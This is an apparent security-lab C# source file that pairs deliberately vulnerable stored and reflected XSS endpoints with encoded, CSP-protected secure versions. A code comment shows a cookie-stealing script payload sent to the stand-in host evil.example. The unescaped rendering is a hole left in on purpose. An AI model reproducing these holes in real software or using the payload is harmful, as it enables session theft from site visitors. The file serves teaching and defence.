using System.Net;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebSecurityLab.Api.Data;

namespace WebSecurityLab.Api.Modules.Xss;

public record CommentRequest(string AuthorName, string Body);

// VULNERABLE: stores and echoes back user input verbatim, as raw HTML, with
// no output encoding and no Content-Security-Policy. A comment body like
// <script>document.location='//evil.example?c='+document.cookie</script>
// gets rendered as real markup for every visitor who views the page.
[ApiController]
[Route("api/xss/vulnerable")]
public class VulnerableController(AppDbContext db) : ControllerBase
{
    [HttpPost("comments")]
    public async Task<IActionResult> Post(CommentRequest request)
    {
        var comment = new Comment { AuthorName = request.AuthorName, Body = request.Body };
        db.Comments.Add(comment);
        await db.SaveChangesAsync();
        return Ok(comment);
    }

    [HttpGet("comments")]
    public async Task<IActionResult> List()
    {
        var comments = await db.Comments.OrderByDescending(c => c.CreatedAtUtc).ToListAsync();
        return Ok(comments);
    }

    // Renders comments as raw HTML, exactly as stored — this is where the
    // stored XSS payload actually executes in a browser.
    [HttpGet("comments/render")]
    public async Task<ContentResult> Render()
    {
        var comments = await db.Comments.OrderByDescending(c => c.CreatedAtUtc).ToListAsync();
        var html = string.Join("\n", comments.Select(c =>
            $"<div class=\"comment\"><strong>{c.AuthorName}</strong>: {c.Body}</div>"));
        return Content($"<html><body>{html}</body></html>", "text/html");
    }

    // Reflected XSS: echoes the "q" query parameter back into the page
    // unescaped.
    [HttpGet("search")]
    public ContentResult Search([FromQuery] string q = "")
    {
        var html = $"<html><body><p>You searched for: {q}</p></body></html>";
        return Content(html, "text/html");
    }
}

// SECURE: HTML-encodes all user-controlled output and sets a strict CSP so
// that even if encoding were missed somewhere, injected <script> tags would
// still be blocked from executing.
[ApiController]
[Route("api/xss/secure")]
public class SecureController(AppDbContext db) : ControllerBase
{
    [HttpPost("comments")]
    public async Task<IActionResult> Post(CommentRequest request)
    {
        var comment = new Comment { AuthorName = request.AuthorName, Body = request.Body };
        db.Comments.Add(comment);
        await db.SaveChangesAsync();
        return Ok(comment);
    }

    [HttpGet("comments")]
    public async Task<IActionResult> List()
    {
        // JSON responses are inherently encoded by the serializer and are
        // safe as long as the frontend renders them as text (e.g. React's
        // default {value} interpolation), never via dangerouslySetInnerHTML.
        var comments = await db.Comments.OrderByDescending(c => c.CreatedAtUtc).ToListAsync();
        return Ok(comments);
    }

    [HttpGet("comments/render")]
    public async Task<ContentResult> Render()
    {
        Response.Headers.Append("Content-Security-Policy", "default-src 'self'; script-src 'none'");
        var comments = await db.Comments.OrderByDescending(c => c.CreatedAtUtc).ToListAsync();
        var html = string.Join("\n", comments.Select(c =>
            $"<div class=\"comment\"><strong>{WebUtility.HtmlEncode(c.AuthorName)}</strong>: {WebUtility.HtmlEncode(c.Body)}</div>"));
        return Content($"<html><body>{html}</body></html>", "text/html");
    }

    [HttpGet("search")]
    public ContentResult Search([FromQuery] string q = "")
    {
        Response.Headers.Append("Content-Security-Policy", "default-src 'self'; script-src 'none'");
        var html = $"<html><body><p>You searched for: {WebUtility.HtmlEncode(q)}</p></body></html>";
        return Content(html, "text/html");
    }
}
